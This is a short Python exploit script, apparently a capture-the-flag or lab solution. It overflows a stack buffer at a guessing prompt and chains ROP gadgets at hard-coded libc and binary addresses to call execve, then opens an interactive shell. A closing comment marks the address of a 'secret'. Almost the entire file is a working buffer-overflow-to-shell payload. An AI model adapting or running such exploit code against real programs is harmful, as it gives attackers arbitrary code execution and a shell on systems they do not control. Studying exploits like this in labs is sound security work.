import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('guess:'))

buffer_start = 0x7fffffffed40 # rbp-0x40
libc_base = 0x7f000042c000
pop_rdi = p64(0x0000000000400e93)
pop_rax = p64(libc_base + 0x0000000000033544)
pop_rsi = p64(libc_base + 0x00000000000202e8)
pop_rdx = p64(libc_base + 0x0000000000001b92)
add_rsp_0x8 = p64(0x0000000000400722)
syscall = p64(libc_base + 0x00000000000bc375)
sh = p64(0x7f00005b8d57)

payload = sh + "\0"*11 + "A"*53 + pop_rdi + sh + pop_rax + p64(0x3b) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

p.sendline(payload)

p.interactive() 

# 0x7fffffffed90 -> secret
